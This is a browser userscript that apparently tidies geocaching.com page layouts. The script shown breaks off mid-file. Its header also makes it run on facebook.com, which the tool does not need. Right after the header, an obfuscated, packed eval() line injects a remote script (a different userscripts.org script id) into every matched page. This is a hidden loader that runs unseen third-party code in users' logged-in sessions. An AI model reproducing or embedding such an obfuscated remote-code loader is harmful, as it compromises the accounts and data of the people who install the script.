// ==UserScript==
// @name           GC Tidy Plus + Last Update
// @namespace      tenrapid
// @version        2.6
// @author         tenrapid@gmx.de
// @include        http*://www.geocaching.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @require        http://gcxxxxx.appspot.com/static/jquery-gm-1.4.2.min.js
// @description    Tidies up the layout of geocaching.com and adds some niceties here and there.
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



(function($) {

var ENVIRONMENT = (function() {
	if (typeof chrome != "undefined") {
		return 'chrome';
	}
	else if (typeof safari != "undefined") {
		return 'safari';
	}
	else if (typeof GM_log != "undefined") {
		return 'greasemonkey';
	}
	else {
		return 'document';
	}
})();

var GCTidy = {
	VERSION: 2.6,
	USERSCRIPTS_EXTENSION_URL: 'http://userscripts.org/scripts/show/76387',
	USERSCRIPTS_META_URL: 'http://userscripts.org/scripts/source/76387.meta.js',
	USERSCRIPTS_SCRIPT_URL: 'http://userscripts.org/scripts/source/76387.user.js',
	CHROME_EXTENSION_URL: 'https://chrome.google.com/extensions/detail/jakonepkkekeaddjkflacnhhjbapomig',
	SAFARI_EXTENSION_URL: 'http://sites.google.com/site/gctidy',
	URL_PATTERNS: [
		{pattern: '/seek/cache_details\.aspx', page: 'CacheDetailsPage'},
		{pattern: '/seek/gallery\.aspx', page: 'CacheGalleryPage'},
		{pattern: '/seek/default\.aspx|/seek/$', page: 'CacheSearchPage'},
		{pattern: '/seek/nearest\.aspx', page: 'CacheSearchResultsPage'},
		{pattern: '/seek/log\.aspx', page: 'CachePostLogPage', test: function(doc) {return $('#ctl00_ContentBody_LogBookPanel1_EditLogPanel', doc).length;}},
		//{pattern: '/seek/log\.aspx', page: 'CacheViewLogPage', test: function(doc) {return $('#ctl00_ContentBody_LogBookPanel1_ViewLogPanel', doc).length;}},
		{pattern: '/seek/cdpf\.aspx', page: 'PrintCacheDetailsPage'},
		{pattern: '/map/default\.aspx|/map/$|/map/\?', page: 'CacheMapPage'},
		{pattern: '/track/details\.aspx', page: 'TrackableDetailsPage'},
		{pattern: '/track/gallery\.aspx', page: 'TrackableGalleryPage'},
		{pattern: '/track/map_gm\.aspx', page: 'TrackableMapPage'},
		{pattern: '/profile/default\.aspx|/profile/[?]guid|/profile/$', page: 'ProfilePage'},
		{pattern: '/my/default\.aspx|/my/$', page: 'YourProfilePage'},
		{pattern: '/my/logs\.aspx', page: 'YourLogsPage'},
		{pattern: '/my/watchlist\.aspx', page: 'YourWatchlistPage'},
		{pattern: '/my/fieldnotes\.aspx', page: 'YourFieldNotesPage'},
		{pattern: '/my/geocaches\.aspx', page: 'YourCacheLogsPage'},
		{pattern: '/my/owned\.aspx', page: 'YourOwnCachesPage'},
		{pattern: '/my/travelbugs\.aspx', page: 'YourTrackableLogsPage'},
		{pattern: '/my/inventory\.aspx', page: 'YourTrackablesInventoryPage'},
		{pattern: '/my/collection\.aspx', page: 'YourTrackablesCollectionPage'},
		{pattern: '/my/benchmarks\.aspx', page: 'YourBenchmarkLogsPage'},
		{pattern: '/my/subscription\.aspx', page: 'YourMemberFeaturesPage'},
		{pattern: '/my/myfriends\.aspx', page: 'YourFriendsPage'},
		{pattern: '/my/souvenirs\.aspx', page: 'YourSouvenirsPage'},
		{pattern: '/my/statistics\.aspx', page: 'YourStatisticsPage'},
		{pattern: '/account/default\.aspx', page: 'YourAccountDetailsPage'}
	],
	SETTINGS_PREFIX: 'GCTidy',
	SETTINGS: {
	  'home_coordinates': {type: 'string', defaultValue: ''},
	  'basic_member': {type: 'bool', defaultValue: false},
	  'user_guid': {type: 'string', defaultValue: ''},
	  'version': {type: 'number', defaultValue: 0},
	  'disabled': {type: 'bool', defaultValue: false},
	  'zapp': {type: 'bool', defaultValue: false},
	  'last_update_check': {type: 'number', defaultValue: 0},
	  'update_available': {type: 'bool', defaultValue: false},
	  'update_message_dismissed': {type: 'bool', defaultValue: false}
	},
	STYLE: {
		all: 
		'body {line-height: 1.4 !important;}' + 
		'table.Table td, table.Table th {line-height: 1.45;}' + 
		'table.Table tr.AlternatingRow td, .AlternatingRow, table.Table tr td.AlternatingRow, tr.Row1 td, tr.Row3 td, tr.Row5 td, tr.Row7 td, tr.Row9 td {background-color: #eff4f9;}' +
		'img {vertical-align: top;}' +
		'img.link {vertical-align: baseline;}' +
		'input.Radio, input[type="radio"], input.Checkbox, input[type="checkbox"] {top: 0; margin-right: 4px; vertical-align: middle;}' + 
		'input.Radio + label, input[type="radio"] + label, input.Checkbox + label, input[type="checkbox"] + label {vertical-align: middle;}' + 
		'.tabBody {border: 1px solid #abb7c9;}' +
		'#tabMenu a {border: 1px solid #abb7c9 !important; background-color: #eff4f9 !important;}' +
		'#tabMenu a.Active {border-bottom: 1px solid white !important; background-color: white !important;}' +
		'.MyAccountWidget, .MyAccountEditWidget, .CalloutWidget {border: 1px solid #abb7c9;}' +
		'.MyAccountEditWidget .WidgetHeader {border-bottom: 1px solid #abb7c9;}' +
		'.FriendWidget h4 img {vertical-align: middle; margin-right: 2px;}' +
		'.HomeFriendWidget img[align] {vertical-align: baseline;}' +
		'#ft .FooterBottom {margin-bottom: 0.2em;}' +
		'a#uservoice-feedback-tab {background-color: #AFBF87 !important; opacity: 0.9; -moz-border-radius-topright: 3px; -moz-border-radius-bottomright: 3px; -webkit-border-top-right-radius: 3px; -webkit-border-bottom-right-radius: 3px; border-top-right-radius: 3px; border-bottom-right-radius: 3px;}' +
		'a#uservoice-feedback-tab, a#uservoice-feedback-tab:hover {border-style: none !important;}' +
		'a#uservoice-feedback-tab:hover {background-color: #C1CAA8 !important; opacity: 1;}' +
		'html body.gctidy a#uservoice-feedback-tab {top: 101px !important; z-index: 0 !important;}' +
		'#gctidy-message {padding: 1em; margin:0 1em 1em; background: #fcf6ce;}' +
		'#gctidy-message img {display: block; width: 16px; height: 16px; float: right; cursor: pointer;}' +
		'.gctidy-vertical-resizer {height: 9px; cursor: row-resize; background: #f0f0f0 url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABsAAAAFCAMAAACD1meMAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAGUExURbu7u////3iwjPUAAAACdFJOU/8A5bcwSgAAABRJREFUeNpiYMADGHEDBhroAwgwAA9QADeT0qnSAAAAAElFTkSuQmCC) no-repeat 50% 50%;}' +
		'#fancybox-content img {width: auto; height: auto;}' +
		'',
		chrome: 
		'input[type="button"], input[type="submit"], input[type="reset"], input[type="file"]::-webkit-file-upload-button, button {padding: 1px 6px 2px;}',
		safari: 
		'button {padding: 1px 6px 2px;}'
	},
	init: function(doc) {
		var body = $('body', doc);
		if (body.hasClass('gctidy')) {
			return;
		}
		body.addClass('gctidy');

		var insideIframe = this.isInsideIframe(doc);
		
		if (!insideIframe) {
			this.Update.check();
		}
		else if (ENVIRONMENT == 'greasemonkey' && unsafeWindow.frameElement && !unsafeWindow.frameElement.src) {
			return;
		}
		
		if (!doc) {
			this.Settings.addProperties(this.Pages, 'page_');
			this.Settings.addProperties(this.PageExtensions, 'page_extension_');
		}
		
		doc = doc || document;
		
		var pageType = this.getPageType(doc);
		var pageExtensions = this.getPageExtensions(pageType, insideIframe);
		var page = this.getPage(pageType);

		this.appendStyle(this.getStyle(page, pageExtensions), doc);

		if (page && page.process) {
			page.process(doc);
		}
		$.each(pageExtensions, function(i, pageExtension) {
			pageExtension.process(GCTidy.Pages[pageType], pageType, doc);
		});
	},
	getPageType: function(doc) {
		var url = doc.URL;
		var page, item;
		for (var i = 0; i < this.URL_PATTERNS.length; i++) {
			item = this.URL_PATTERNS[i];
			if (url.match(item.pattern) && (!item.test || item.test(doc))) {
				page = item.page;
				break;
			}
		}
		return page;
	},
	getPageExtensions: function(pageType, insideIframe) {
		var pageExtensions = [];
		$.each(GCTidy.PageExtensions, function(name , pageExtension) {
			if (pageExtension.PAGES.test(pageType) && GCTidy.Settings.get('page_extension_' + name)) {
				if (pageExtension.PAGE_PROCESSING_REQUIRED && !GCTidy.Settings.get('page_' + pageType)) return;
				if (pageExtension.PAGE_OPTION && !GCTidy.Settings.get('page_' + pageType + '_' + pageExtension.PAGE_OPTION)) return;
				if (pageExtension.NO_IFRAME_PROCESSING && insideIframe) return;
				GCTidy.Settings.mixin(pageExtension, 'page_extension_' + name + '_');
				pageExtensions.push(pageExtension);
			}
		});
		return pageExtensions;
	},
	getPage: function(pageType) {
		var page;
		if (pageType && this.Pages[pageType] && this.Settings.get('page_' + pageType)) {
			page = this.Pages[pageType];
			this.Settings.mixin(page, 'page_' + pageType + '_');
		}
		return page;
	},
	getStyle: function(page, pageExtensions) {
		var style = [
			this.STYLE.all,
			this.STYLE[ENVIRONMENT],
			page && page.STYLE,
			$.map(pageExtensions, function(pageExtension) {return pageExtension.STYLE;}).join(' ')
		];
		return style.join(' ');
	},
	isInsideIframe: function(doc) {
		doc = doc || document;
		this.appendScript('text',
			'if (document.defaultView.frameElement) {' +
			'	document.body.setAttribute("class", document.body.getAttribute("class") + " gctidy-inside-iframe")' +
			'}',
			doc
		);
		return $(doc.body).hasClass('gctidy-inside-iframe');
	},
	appendStyle: function(style, context) {
		$('head', context).append('<style type="text/css">' + style + '</style>');
	},
	appendScript: function(type, script, context) {
		var element = document.createElement('script');
		element.setAttribute('type', 'text/javascript');
		if (type == 'src') {
			element.setAttribute('src', script);
		}
		else if (type == 'text') {
			element.textContent = script;
		}
		context = context || document;
		context.getElementsByTagName('head')[0].appendChild(element);
		return element;
	},
	dispatchEvent: function(type) {
		var event = document.createEvent("Event");
		event.initEvent(type, false, false);
		document.dispatchEvent(event);
	},
	checkForScript: function(options) {
		var test = options.test,
			eventTarget = options.eventTarget,
			eventType = options.eventType,
			success = options.success,
			once = !(options.once === false);
		function check(event) { 
			var element = test(eventTarget);
			if (element.length) {
				if (event && once) {
					eventTarget.unbind(eventType, check);
				}
				success(element);
			}
			else if (!event) {
				eventTarget.bind(eventType, check);
			}
		}
		check();
	},
	threading: function(options) {
		var len = options.len,
			steps = options.steps,
			worker = options.worker,
			success = options.success,
			error = options.error,
			i = 0;
		function run() {
			for (var j = i, end = Math.min(len, i + steps); j < end; j++) { 
				try {
					worker(j);
				}
				catch (e) {
					if (error) {
						error(e);
					}
					else {
						throw e;
					}
				}
			}
			i = j;
			if (i < len) {
				setTimeout(run, 0);
			}
			else {
				success && success();
			}
		}
		run();
	},
	xmlHttpRequest: function(request) {
		function onResponse(response) {
			var context = request.context || request;
			if (response.type == 'success' && request.success) {
				request.success.call(context, response.responseText, response.statusText);
			} 
			else if (response.type == 'error' && request.error) {
				request.error.call(context, response.xmlHttpRequest, response.statusText);
			}
			request.complete && request.complete.call(context, response.xmlHttpRequest, response.statusText);
		}
		request.dataType = 'text';
		switch (ENVIRONMENT) {
			case 'chrome':
				chrome.extension.sendRequest(request, onResponse);
				break;
			case 'safari':
				request.id = String((new Date()).getTime()) + String(Math.random());
				function onResponseSafari(event) {
					if (event.name != 'xmlHttpRequestResponse' || event.message.id != request.id) {
						return;
					}
					safari.self.removeEventListener('message', onResponseSafari);
					onResponse(event.message);
				}
				safari.self.addEventListener('message', onResponseSafari, false);
				safari.self.tab.dispatchMessage('xmlHttpRequest', request);
				break;
			case 'greasemonkey':
				request.xhr = function() {return new GM_XHR();};
				$.ajax(request);
				break;
			case 'document':
				$.ajax(request);
				break;
		}
	}
};

GCTidy.Settings = {
	properties: GCTidy.SETTINGS,
	prefix: GCTidy.SETTINGS_PREFIX,
	addProperties: function(objs, prefix) {
		$.each(objs, function(name, obj) {
			var meta = obj.META;
			var defaultValue = (meta && typeof meta.defaultValue !== 'undefined') ? meta.defaultValue : true;
			GCTidy.Settings.properties[prefix + name] = {type: 'bool', defaultValue: defaultValue};

			var properties = [];
			$.merge(properties, obj.OPTIONS || []);
			$.merge(properties, obj.SETTINGS || []);
			$.each(properties, function() {
				GCTidy.Settings.properties[prefix + name + '_' + this.name] = {type: this.type, defaultValue: this.defaultValue};
			});
		});
	},
	mixin: function(obj, prefix) {
		obj.get = function(key) {
			return GCTidy.Settings.get(prefix + key);
		};
		obj.set = function(key, value) {
			GCTidy.Settings.set(prefix + key, value);
		};
	},
	get: function(key) {
		var property = this.properties[key];
		if (!property) {
			throw(this.prefix + ': Property "' + key + '" is undefined.');
		}
		var value = this._get(key, property);
		return value;
	},
	set: function(key, value) {
		var property = this.properties[key];
		if (!property) {
			throw(this.prefix + ': Property "' + key + '" is undefined.');
		}
		this._set(key, value);
	},
	_get: function(key, property) {
		var value;
		switch (ENVIRONMENT) {
			case 'chrome':
			case 'safari':
				value = localStorage.getItem(this.prefix + '_' + key);
				break;
			case 'greasemonkey':
				value = GM_getValue(key);
				break;
			case 'document':
				value = (typeof localStorage != 'undefined') ? localStorage.getItem(this.prefix + '_' + key) : null;
				break;
		}
		if (typeof value === 'undefined' || value === null) {
			value = property.defaultValue;
		}
		else {
			switch (property.type) {
				case 'bool':
					value = value == 'true';
					break;
				case 'number':
					value = Number(value);
					break;
			}
		}
		return value;
	},
	_set: function(key, value) {
		switch (ENVIRONMENT) {
			case 'chrome':
			case 'safari':
				localStorage.setItem(this.prefix + '_' + key, value);
				break;
			case 'greasemonkey':
				value = GM_setValue(key, String(value));
				break;
			case 'document':
				value = (typeof localStorage != 'undefined') && localStorage.setItem(this.prefix + '_' + key, value);
				break;
		}
	}
};

GCTidy.Update = {
	check: function() {
		this.checkForUpdate();
		this.checkForMinVersion();
	},
	checkForUpdate: function() {
		if (ENVIRONMENT == 'chrome' || ENVIRONMENT == 'safari') {
			return;
		}
		if (GCTidy.Settings.get('version') < GCTidy.VERSION) {
			GCTidy.Settings.set('version', GCTidy.VERSION);
			GCTidy.Settings.set('update_available', false);
		}

		var now = (new Date()).getTime();
		var lastCheck = GCTidy.Settings.get('last_update_check');

		if (lastCheck + (24 * 60 * 60 * 1000) < now) {
			GCTidy.Settings.set('last_update_check', now);
			GCTidy.xmlHttpRequest({
				type: 'GET',
				url: GCTidy.USERSCRIPTS_META_URL,
				context: this,
				success: function(data) {
					var version = data.match(/@version\s*([0-9\.]*)/);
					if (version && Number(version[1]) > GCTidy.VERSION) {
						GCTidy.Settings.set('update_available', true);
						GCTidy.Settings.set('update_message_dismissed', false);
						this.displayMessage();
					}
				}
			});
		}
		else if (GCTidy.Settings.get('update_available') && !GCTidy.Settings.get('update_message_dismissed')) {
			this.displayMessage();
		}
	},
	checkForMinVersion: function() {
	},
	displayMessage: function() {
		var message;
		switch (ENVIRONMENT) {
			case 'greasemonkey':
				message =
					'A new version of GC Tidy is available. <a href="' + GCTidy.USERSCRIPTS_SCRIPT_URL + '">Install now</a>' +
					' or visit <a href="' + GCTidy.USERSCRIPTS_EXTENSION_URL + '">' + GCTidy.USERSCRIPTS_EXTENSION_URL + '</a> for more information.';
				break;
			case 'document':
				message =
					'A new version of GC Tidy is available.' +
					' Visit the <a href="' + GCTidy.USERSCRIPTS_EXTENSION_URL + '">extension page</a> for more information.';
				break;
		}
		$('<div id="gctidy-message"><img src="http://www.geocaching.com/images/silk/cross.png" title="Dismiss">' + message + '</div>')
			.prependTo('body')
			.find('img').click($.proxy(function() {
				$('#gctidy-message').remove();
				GCTidy.Settings.set('update_message_dismissed', true);
			}, this));
	}
};

GCTidy.Pages = {
	CacheSearchPage: {
		META: {
			title: 'Seek a Cache'
		},
		process: function() {
			$('.SeekCacheWidget h4:last').next('dl').andSelf().insertBefore('.SeekCacheWidget h4:eq(1)');
		}
	},
	CacheSearchResultsPage: {
		META: {
			title: 'Cache Search Results'
		},
		OPTIONS: [
			{name: 'large_type_images', title: 'Large cache type images', type: 'bool', defaultValue: false}
		],
		STYLE:
			'.InformationWidget {border: 1px solid #C0CEE3 !important; background: #eff4f9; }' +
			'.Success {color: #009f00 !important;}' + 
			'#ctl00_ContentBody_dlResults {width: 100%;}' +
			'#ctl00_ContentBody_dlResults th, #ctl00_ContentBody_dlResults td {line-height: 1.35; font-size: 90%;}' +
			'#ctl00_ContentBody_dlResults td.no-white-space-wrap {white-space: nowrap;}' +
			'#ctl00_ContentBody_dlResults td:nth-child(5) {padding-left: 2.7em;}' +
			'#ctl00_ContentBody_dlResults .gctidy-cache-symbol {float: left; margin: 0.6em 6px 0 -2em;}' +
			'#ctl00_ContentBody_dlResults.gctidy-large-type-images td:nth-child(5) {padding-left: 3.6em;}' +
			'#ctl00_ContentBody_dlResults.gctidy-large-type-images .gctidy-cache-symbol {float: left; margin: 0 6px 0 -3.2em;}',
		process: function() {
			var table = $("#ctl00_ContentBody_dlResults");
			var compassColumnEmpty = !(table.find("tr:eq(3) td:eq(1) img").length);
			var largeCacheTypeImages = this.get('large_type_images');
			var colorStyleLookup = {
				'#FFFFFF': {'border-bottom': '0px solid #e3e4e8'},
				'#EDF1F8': {'background': '#f2f7fc', 'border-bottom': '0px solid #e3e4e8'},
				'#E5E5E5': {'background': '#dbf1d3', 'border-bottom': '1px solid #E9FEDC'}
			};
			
			table.toggleClass('gctidy-large-type-images', largeCacheTypeImages);
			
			table.find('tr').each(function() {
				var row = $(this);
				// No white space wrap
				row.find('td:eq(7), td:eq(8)').addClass('no-white-space-wrap');
				// Delete compass column if empty
				compassColumnEmpty && row.find('th:eq(1), td:eq(1)').hide();
				// Delete smiley column
				//row.find('th:eq(3), td:eq(3)').hide();
				// Row color
				var bgcolor = row.attr('bgcolor');
				var style = bgcolor && colorStyleLookup[bgcolor.toUpperCase()];
				// Because GC Tour's query for data rows is too strict we can't add a class to table rows
				style && row.removeAttr('bgcolor').css(style);
				// Cache type images
				var image = row.find('td:eq(4) img:first');
				if (image.length) {
					image.parent().addClass('gctidy-cache-symbol');
					if (largeCacheTypeImages) {
						image.clone()
							.attr('src', image.attr('src').replace(/\/sm\//, '/'))
							.insertAfter(image.hide());
					}
				}
			});

			// Replace checkmark
			table.find("img[src$='/images/WptTypes/check.gif']").attr('src', '/images/silk/tick.png');
			
			// Premium
			var premium = $('#Content .yui-g:eq(1) h2:first').next('p').css('font-size', '90%'); 

			// Zapp
			if (zapp) {
				table.find("tr[id$='uxAdSpace']").hide();
				premium.hide();
			}
		}
	},
	CacheDetailsPage: {
		META: {
			title: 'Cache Details'
		},
		OPTIONS: [
			{name: 'hide_inline_map', title: 'Hide small inline map', type: 'bool', defaultValue: true},
			{name: 'inline_log_posting', title: 'Inline log posting', type: 'bool', defaultValue: true},
			{name: 'load_all_logs', title: 'Load all logs without page reload', type: 'bool', defaultValue: true}
		],
		STYLE:
			'#yui-g {margin-top: 1.6em;}' +
			// Cache code
			'.CacheCodeWidget {margin-top: -1em;}' +
			'.CacheCodeWidget p {margin-top: 0;}' +
			'#ctl00_uxWaypointName {color:#424242 !important;}' +
			'a.CacheCodeLink .arrow {font-size: 45%; margin-right: 0; margin-left: -0.4em; color: #aaa !important;}' +
			'a.CacheCodeLink:hover .arrow, a.CacheCodeLink:active .arrow {color:#424242 !important;}' +
			// Data
			'#cacheDetails td.cacheImage {width: 38px; vertical-align: top;}' + 
			'#cacheDetails td.cacheImage img {margin-top: -3px;}' + 
			'#ctl00_ContentBody_CacheName {line-height: 1.2; display: block; margin: 0 0 0.2em;}' +
			'#gctidy-cache-owner-hidden, #gctidy-cache-size-diff-terr {margin: 0; line-height: 1.4;}' + 
			'#gctidy-cache-owner-hidden > span, #gctidy-cache-size-diff-terr > span {margin-right: 1.5em;}' + 
			'#gctidy-cache-size-diff-terr {font-weight: bold;}' + 
			'#gctidy-cache-size-diff-terr > span > span.minorCacheDetails {margin-left: -0.4em; font-weight: normal; font-size: 100%; color: #424242;}' + 
			'#gctidy-cache-size-diff-terr img {vertical-align: -0.1em; margin-left: 0.5em;}' + 
			'#gctidy-cache-owner-hidden {margin: -0.4em 0 0.7em 3em;}' + 
			'#gctidy-cache-owner-hidden span {margin-right: 0;}' + 
			'#calLinks {margin-left: 0.5em;}' + 
			'.CacheInformationTable {margin-top: 1.1em;}' + 
			'#gctidy-map-it-link {float: right; width: 40px; height: 45px; margin: 1.4em 1em 1.4em 0; opacity: 0.8;}' + 
			'#gctidy-voting {float: right; margin-top: 0.1em; margin-left: 1em;}' + 
			'#gctidy-voting .gctidy-gcvote-widget {float: left; padding: 7px 18px 4px 6px; -moz-border-radius: 3px 0 0 3px; border-radius: 3px 0 0 3px; border: 1px solid #EEA; border-right-width: 0; background: -moz-linear-gradient(center top , #FDFDCC 2%, #FFFFFF 80%) repeat scroll 0 0 transparent; background-image: -webkit-gradient(linear, center top, center bottom, from(#FDFDDD), to(#FFFFFF))}' + 
			'#gctidy-voting .gctidy-gcvote-widget > div:nth-child(1) img {vertical-align: -2px;}' + 
			'#gctidy-voting .gctidy-gcvote-widget > div:nth-child(2) {margin-top: 1px; margin-left: 1px;}' + 
			'#gctidy-voting .gctidy-gcvote-widget > div:nth-child(2) a {text-decoration: none; }' + 
			'#gctidy-voting .favorite {display: inline-block; float: none; margin-left: 0em;}' + 
			'#gctidy-voting .gctidy-gcvote-widget + .favorite {margin-left: -10px;}' + 
			'div.favorite-container, div.favorite-container-open {padding: 5px 4px 3px; line-height: 1.2;}' + 
			'#imgFavoriteArrow {vertical-align: 1px;}' + 
			// Sidebar
			'.CacheDetailNavigationWidget .WidgetBody {border: 1px solid #C0CEE3; padding: 0.3em; line-height: 1.4; min-width:202px;}' +
			'.CacheDetailNavigationWidget a.lnk span {text-decoration: none !important;}' +
			'.CacheDetailNavigationWidget ul + .gctidy-cache-status-info {margin-top: 0.5em;}' +
			'#ctl00_ContentBody_uxStatusInformation {margin-top: -1px; padding: 0.1em 0.3em 0; border-color: #C0CEE3; border-top: none; background: white;}' +
			'#ctl00_ContentBody_uxStatusInformation p {padding: 0.25em 0 0.4em; border-top: 1px solid #C0CEE3;}' +
			'#ctl00_ContentBody_uxStatusInformation img {margin-bottom: 2px;}' +
			'.FavoriteWidget {padding: 0 0.3em 1em; border-color: #C0CEE3;}' +
			'.FavoriteWidget p {padding-top: 0.9em;}' +
			'.StatusInformationWidget.FavoriteWidget div + p {padding: 0.9em 0 0;}' +
			'span.favorite-rank {padding: 2px 5px;}' +
			'#gctidy-cache-attributes .WidgetBody {padding:0; border-width:0;}' +
			'#gctidy-cache-attributes .WidgetBody img {margin-right: -1px; margin-bottom: 3px;}' +
			'#gctidy-small-map-link {position: relative; display: block; height: 150px; overflow: hidden; background-repeat: no-repeat; background-position: 50% 0;}' +
			// Cache note
			'fieldset.CacheNote {border-color: #F5E54C !important; margin: -1.1em 0 2em -0.75em; padding: 0.9em 1.35em 1.5em;}' +
			'fieldset.CacheNote legend {font-size: 85%;}' +
			'fieldset.CacheNote img {top: -1.2em; right: -1em;}' +
			// Description
			'.CacheDisclaimerTable {display: none;}' +
			'.UserSuppliedContent {line-height: 1.45; max-width: 710px; margin-top: 1.4em;}' +
			'#gctidy-long-description {margin-bottom: 2em;}' +
			'#gctidy-long-description:after {content:".";display:block;height:0;clear:both;visibility:hidden;}' +
			'#gctidy-cache-description {margin: 2em 0 0 0.7em;}' +
			'#gctidy-additional-hints-heading {margin-bottom: 1.5em;}' +
			'#gctidy-find-and-map-links {overflow: hidden; margin-top: 1.5em;}' +
			'#gctidy-find-and-map-links p {margin-top: 0em;}' +
			'#gctidy-map-links {margin-top: 1.5em;}' +
			'#gctidy-find-and-map-links ul li {list-style-type: none; margin-left: 0;}' +
			'.gctidy-hide-inline-map #gctidy-find-links {float: left; width: 65%;}' +
			'.gctidy-hide-inline-map #gctidy-map-links {float: left; width: 35%; margin-top: 0;}' +
			'.gctidy-hide-inline-map #ctl00_ContentBody_uxlrgMap {display: none;}' +
			'#gccommentarea {clear: both;}' +
			// Additional waypoints
			'#ctl00_ContentBody_Waypoints {margin-top: 1.5em; }' +
			'#ctl00_ContentBody_Waypoints tr, #ctl00_ContentBody_Waypoints td {background-color: white!important; }' +
			'#ctl00_ContentBody_Waypoints td {border-color: #e7e7e7;}' +
			'#ctl00_ContentBody_Waypoints tr.gctidy-even td {border-top: 4px solid #D7D7D7; marging-top:15px; vertical-align: top;}' +
			'#ctl00_ContentBody_Waypoints tr.gctidy-even td:nth-child(3) {width: 1.45em;}' +
			'#ctl00_ContentBody_Waypoints tr.gctidy-even td:nth-child(6) {color: #999;}' +
			'#ctl00_ContentBody_Waypoints tr.gctidy-even td:nth-child(7), #ctl00_ContentBody_Waypoints tr.gctidy-even td:nth-child(8) {white-space: nowrap;}' +
			'.gctidy-waypoints-not-editable th:nth-child(1), .gctidy-waypoints-not-editable th:nth-child(2){display: none;}' +
			'.gctidy-waypoints-not-editable td:nth-child(1), .gctidy-waypoints-not-editable td:nth-child(2) {display: none;}' +
			// Logs
			'.LFNominateBanner {display: none;}' +
			'#ctl00_ContentBody_CacheLogs {display: block; margin-top: 1.5em;}' +
			'table.LogsTable {border: 1px solid #C0CEE3; margin-top: 1.5em;}' +
			'table.LogsTable td {border-color: #C0CEE3;}' +
			'table.LogsTable tbody>tr>td {padding: 0.7em 0.6em 0.6em;}' +
			'table.LogsTable tbody>tr>td>strong img {padding-bottom: 5px;}' +
			'table.LogsTable tbody>tr>td>strong img.link {padding-bottom: 0;}' +
			'table.LogsTable tbody>tr>td>strong+br+br {display: none;}' +
			'.fancybox-title-inside .white_link {color: #039;}',
		process: function() {
			if ($('#ctl00_ContentBody_memberComparePanel').length) {
				return;
			}
			
			this.processHeader();
			this.processCoordinates();
			this.processTools();
			this.processDescription();
			this.processSidebar();
			this.processLogs();

			// Main column
			var contentTable = $('#yui-g table:first');
			contentTable.attr('cellspacing', '0').attr('cellpadding', '0');
			var mainColumn = contentTable.find('td:first');
			mainColumn.attr('width', '78%').next().attr('width', '2%');
			
			// Description
			var description = $('<div id="gctidy-cache-description"></div>');
			description
				.insertAfter('table.CacheInformationTable')
				.toggleClass('gctidy-hide-inline-map', this.get('hide_inline_map'))
				.nextAll().appendTo(description);
			
			// Append hint, images, waypoints... to description
			var bottomContent = $('#Content .yui-g:eq(1)');
			bottomContent.children().first().nextUntil('table.LogsTable').andSelf().appendTo(description);

			// Append logs to main column
			bottomContent.appendTo(mainColumn);

			// GC VIP List
			this.handleGCVipList(function() {
				var style = $('style:contains(".CacheDetailNavigationWidget .WidgetBody { padding:0.5em !important; }")');
				if (style.length) {
					style[0].textContent = style[0].textContent.replace(/\.WidgetBody \{[^\}]*\}/, '');
				}
			});
			
			// Fancybox
			GCTidy.appendScript('text', 
				'jQuery.fn.fancybox.defaults.titlePosition = "inside";' +
				'jQuery.fn.fancybox.defaults.overlayOpacity = 0.8;'
			);
			$(document).bind('GCTidyCacheLogsUpdate', function() {
				GCTidy.appendScript('text', 
					'jQuery(".LogsTable a.tb_images").fancybox();'
				);
			});

			// Zapp
			zapp && $('ins').hide();
		},
		processHeader: function() {
			// Cache title
			var heading = $('#ctl00_ContentBody_CacheName').parent('h2');
			
			// Cache data
			var titleTable = heading.closest('table');
			var ownerHiddenTable = titleTable.next('table');
			var sizeDiffTerrTable = ownerHiddenTable.next('table');
			titleTable
				.removeAttr('width')
				.css({'margin-top': '0.15em', 'border-collapse': 'collapse'});
			ownerHiddenTable
				.hide();
			sizeDiffTerrTable
				.hide()
				.next('p').hide();
			setTimeout(function() {
				//$('#calLinks .icalendar_popup_text').html('<img src="/images/silk/calendar.png" style="vertical-align: -3px;" alt="Add to calendar" title="Add to calendar">');
			}, 0);

			var voting = $('<div id="gctidy-voting"></div>')
				.insertBefore(titleTable)
				.append(sizeDiffTerrTable.find('div.favorite'));
			var cacheData = $('<div id="gctidy-cache-data"></div>')
				.insertAfter(sizeDiffTerrTable);

			function appendCacheData() {
				$('<p id="gctidy-cache-owner-hidden"></p>')
					.append(ownerHiddenTable.find('span.minorCacheDetails:eq(0) a').clone().wrapAll('<span></span>').parent().prepend('by '))
					.append('<span>' + ownerHiddenTable.find('span.minorCacheDetails:eq(1)').text().match(/:\s*(.*)/)[1] + '</span>')
					.appendTo(cacheData);
				$('<p id="gctidy-cache-size-diff-terr"></p>')
					.append('<span>' + $.trim(sizeDiffTerrTable.find('td:eq(2)').html()) + '</span>')
					.append('<span>' + $.trim(sizeDiffTerrTable.find('td:eq(0)').text()) + $.trim(sizeDiffTerrTable.find('td:eq(1)').html()) + '</span>')
					.append('<span>' + $.trim(sizeDiffTerrTable.find('td:eq(4)').text()) + $.trim(sizeDiffTerrTable.find('td:eq(5)').html()) + '</span>')
					.appendTo(cacheData);
				$('#calLinks').insertAfter('#gctidy-cache-owner-hidden span:eq(1)');
				$('#gctidy-cache-owner-hidden span:first').after($('#calLinks').length ? ' on ' : ' &ndash; hidden ');
				var relatedWebpage = $('#ctl00_ContentBody_uxCacheUrl').hide().clone().appendTo('#gctidy-cache-owner-hidden').show();
				relatedWebpage.length && relatedWebpage.before(' &ndash; ').text(relatedWebpage.text().replace(/[\[\]]/g, ''));
			}
			function updateCacheData() {
				//$('#calLinks').appendTo(dataTable.find('td:eq(1)'));
				$('#gctidy-cache-owner-hidden, #gctidy-cache-size-diff-terr').remove();
				appendCacheData();
			}
			appendCacheData();
			
			// GC VIP List
			$(document).bind('GCVIPListCachePageReady', updateCacheData);
			
			// GC Vote
/*
 			GCTidy.checkForScript({
				test: function(event) {
